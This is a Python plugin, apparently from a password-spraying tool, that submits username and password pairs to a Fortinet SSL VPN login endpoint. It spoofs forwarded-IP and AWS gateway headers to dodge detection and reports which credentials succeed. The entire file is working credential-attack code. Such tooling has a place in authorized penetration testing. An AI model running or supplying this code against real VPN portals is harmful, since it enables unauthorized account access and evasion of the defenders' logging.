import requests
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def fortinetvpn_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }
    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    # CHANGEME: Add more if necessary
    headers = {
        'User-Agent' : useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,

        'Content-Type': 'application/x-www-form-urlencoded'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    post_params = {
        "ajax" : '1',
        'username' : username,
        'credential' : password,
        'realm' : ''
    }

    if 'domain' in pluginargs.keys():
        post_params['realm'] = pluginargs['domain']

    try:

        resp = requests.post("{}/remote/logincheck".format(url),data=post_params,headers=headers)

        if resp.status_code == 200 and 'redir=' in resp.text and '&portal=' in resp.text:
            data_response['result'] = "success"
            data_response['output'] = '[+] SUCCESS: => {}:{}'.format(username, password)
            data_response['valid_user'] = True

            if 'domain' in pluginargs.keys():
                data_response['output'] = data_response['output'] + " Domain: {}".format(pluginargs['domain'])

        else: #fail
            data_response['result'] = "failure"
            data_response['output'] = '[-] FAILURE: {} => {}:{}'.format(resp.status_code, username, password)


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
